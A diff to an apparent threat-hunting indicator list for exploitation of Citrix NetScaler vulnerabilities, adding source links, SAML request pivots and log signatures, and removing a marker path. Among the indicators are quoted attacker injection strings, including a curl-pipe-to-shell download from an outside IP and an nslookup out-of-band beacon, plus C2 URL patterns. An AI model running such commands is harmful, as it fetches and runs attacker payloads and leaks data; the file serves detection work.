@@ -19,6 +19,8 @@ The source labels in this file refer to the public reporting below.
 - Nextron Systems: https://www.nextron-systems.com/2026/10/06/update-on-citrix-netscaler-cve-2026-88771-and-cve-2026-88772-expanded-thor-detection-coverage/
 - Fortra Emerging Threats: https://www.fortra.com/security/emerging-threats/netscaler-cve-2026-88771-improper-input-validation-and-cve-2026-88772
 - SOCRadar NetScaler C2: https://socradar.io/blog/netscaler-c2-cve-2026-88771-exploitation/
+- Censys CVE-2026-88771 / CVE-2026-88772 advisory: https://censys.com/advisory/cve-2026-88771-cve-2026-88772/
+- Decryption Digest CVE-2026-88779 SAML zero-day notes: https://www.decryptiondigest.com/blog/citrix-netscaler-saml-zero-day-cve-2026-88779-patch
 - Beazley Security Labs BSL-A1216: https://labs.beazley.security/advisories/BSL-A1216
 - PitScaler public briefing / IOC compilation: https://pitscaler.com/
 - PitScaler public IOC table: https://pitscaler.com/netscaler-iocs/
@@ -197,7 +199,6 @@ Sources:
 /v
 /tmp/v
 /var/tmp/v
-/tmp/watchTowr
 /var/tmp/wtw888
 /var/tmp/boom
 /var/tmp/sh
@@ -345,6 +346,7 @@ Examples include:
 - `pitboss PPE missed too many heartbeats`
 - `pitboss PPE unexpectedly died NSPPE`
 - `pitboss PPE missed too many heartbeats NSPPE`
+- Censys `AAAD API: sending login req` and `process_kernel_socket` log context around poisoned login fields or User-Agent values
 - Elastic-style generic `pitboss` / packet-engine records containing shell metacharacters or URL-encoded shell syntax
 - SOCRadar NetScaler C2 injection strings such as `pitboss NSPPE-00;`, `curl${IFS}-sk${IFS}45.143.130.195:8899/s/<bid>|sh`, `nslookup${IFS}<bid>.p1.oob.45.143.130.195`, `/s/<bid>|sh`, and `;# unexpectedly died`
 - `NSPPE-00` malformed token variants
@@ -385,8 +387,10 @@ Examples include:
 - `/epa/scripts/linux/nsepa.deb`
 - `vp_probe_nonexist`
 - `/saml/login`
+- `/saml/logout`
 - `/cgi/samlauth`
 - `/cgi/login`
+- large SAML request pivots involving `/saml/login`, `/saml/logout`, or `/cgi/samlauth` with `Content-Length` values of roughly 65 KB or larger
 - `/p/u/doAuthentication.do`
 - `/p/u/doLogon.do`
 - `receiver.min.<hex>.css`
@@ -411,7 +415,7 @@ Examples include:
 - TENEX/Poppelgaard Platypus pivots involving `/var/core/.ns-cache`, `client.crt`, `client.key`, `/netscaler.local/ns_*.pl`, and replaced `/var/python/bin/customsnmpd`
 - Corelight/PitScaler/Poppelgaard pivots involving `194.26.29.88`, `138.199.200.90`, `echvista.com`, `gsocket.io`, `nsepa.deb`, and `vp_probe_nonexist`
 - SOCRadar NetScaler C2 pivots involving `45.143.130.195`, `/tmp/.nsagent`, `/s/<bid>`, `/a/<bid>`, `/p/<bid>?h=<hex_hostname>&u=<hex_username>&src=agent`, `/c/<bid>`, and `/r/<bid>?d=<hex>`
-- exploit marker/output files such as `nx_verify.html`, `id009.txt`, `rce.txt`, `/tmp/watchTowr`, `/var/tmp/wtw*`, `/var/tmp/boom`, and small files containing `uid=0(root)`
+- exploit marker/output files such as `nx_verify.html`, `id009.txt`, `rce.txt`, `/var/tmp/boom`, and small files containing `uid=0(root)`
 - Sliver delivery pivots involving `/HaKi2ufpiQ8AeVTZ/host`, `citrix3.bad`, and `IMPLANT_CAPABILITY_TUNNEL_TERMINAL_V1`
 - eSentire cluster pivots including `nsgtrust.deb`, `entretiensol.com`, Platypus enrollment paths, `platypus-agent/public-ip-probe`, and `application/x-protobuf-platypus-v2`
 - config/private-key dump pivots including `===CONF:`, `===KEY:`, private-key markers, random `.css` files under `LogonPoint`, and `curl --data-binary` to TCP/8877
